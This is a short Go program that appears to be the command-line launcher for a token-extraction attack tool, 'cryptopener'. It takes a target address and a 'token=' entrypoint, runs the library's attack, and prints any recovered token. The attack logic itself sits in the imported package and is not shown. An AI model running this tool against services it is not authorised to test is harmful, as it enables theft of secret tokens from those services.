package main

import (
	"fmt"
	"flag"
	cryptopener "github.com/larikuistio/cryptopener"
)


func main() {

	var target string
	var entrypoint string
	flag.StringVar(&target, "target", "127.0.0.1:8080", "target address of attack")
	flag.StringVar(&entrypoint, "entrypoint", "token=", "entrypoint of attck")

	flag.Parse()

	cryptopener := cryptopener.NewCryptopener(target, entrypoint)
	cryptopener.Run()
	defer func ()  {
		fmt.Printf("Found token, tokens is %s", cryptopener.ResultToken)
	}()
}
